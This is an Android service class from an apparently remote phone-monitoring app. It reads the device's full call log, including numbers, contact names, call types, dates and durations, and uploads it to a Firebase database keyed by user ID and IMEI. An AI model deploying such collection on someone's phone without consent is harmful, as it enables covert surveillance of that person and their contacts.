package com.example.lapcs.services;

import android.Manifest;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;


public class getCalls extends IntentService {

    DatabaseReference mDatabase;
    SharedPreferences sharedPreferences;
    SharedPreferences.Editor editor;
    public getCalls() {
        super("getCalls");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        mDatabase = FirebaseDatabase.getInstance().getReference();
        sharedPreferences = getSharedPreferences("MyData", Context.MODE_PRIVATE);
        editor=sharedPreferences.edit();
        final String Imei = sharedPreferences.getString("Imei", "");
        final String userID = sharedPreferences.getString("UserID", "");
        StringBuffer sb = new StringBuffer();
        sb.append("");
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        Cursor managedCursor = getApplicationContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int number = managedCursor.getColumnIndex( CallLog.Calls.NUMBER );
        int type = managedCursor.getColumnIndex( CallLog.Calls.TYPE );
        int date = managedCursor.getColumnIndex( CallLog.Calls.DATE);
        int name=managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
        int dur=managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        if(managedCursor.moveToFirst())
        {
            do {
                String phNumber = managedCursor.getString( number );
                String phName = managedCursor.getString(name);
                String callType = managedCursor.getString( type );
                String callDate = managedCursor.getString( date );
                Date callDayTime = new Date(Long.valueOf(callDate));
                SimpleDateFormat outputFormat = new SimpleDateFormat("dd-MMM-yyyy h:mm a");
                String dateTime=outputFormat.format(callDayTime);
                int duration =Integer.parseInt(managedCursor.getString( dur ));
                int seconds = duration % 60;
                int hours = duration / 60;
                int minutes = hours % 60;
                hours = hours / 60;
                String dir = null;
                int dircode = Integer.parseInt( callType );
                switch( dircode ) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;

                    case CallLog.Calls.REJECTED_TYPE:
                        dir = "REJECTED";
                        break;
                }
                if(phName==null)
                    sb.append( " "+dir+" Name: Unknown Number Number: "+phNumber +"Duration: "+hours + "h " + minutes + "m " + seconds+ "s" +" Date: "+dateTime);
                else
                    sb.append( " "+dir+" Name: "+phName +" Number: "+phNumber +"Duration: "+hours + "h " + minutes + "m " + seconds+ "s" +" Date: "+dateTime);
                sb.append("/");
            }while ( managedCursor.moveToNext() );
        }
        mDatabase.child("Users").child(userID).child(Imei).child("getCalls").setValue("NA");
        mDatabase.child("Users").child(userID).child(Imei).child("getCalls").setValue("requestCalls/"+sb);
    }
}
